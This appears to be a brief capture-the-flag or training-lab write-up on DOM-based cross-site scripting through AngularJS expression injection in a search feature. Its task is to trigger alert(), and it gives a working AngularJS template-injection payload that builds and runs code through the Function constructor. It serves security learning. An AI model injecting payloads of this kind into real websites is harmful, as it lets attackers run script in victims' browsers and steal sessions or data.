# DOM XSS in AngularJS Expression within Search Functionality

## Task : Call the `alert()` function

Analysis : {{$on.constructor('alert(1)')()}}
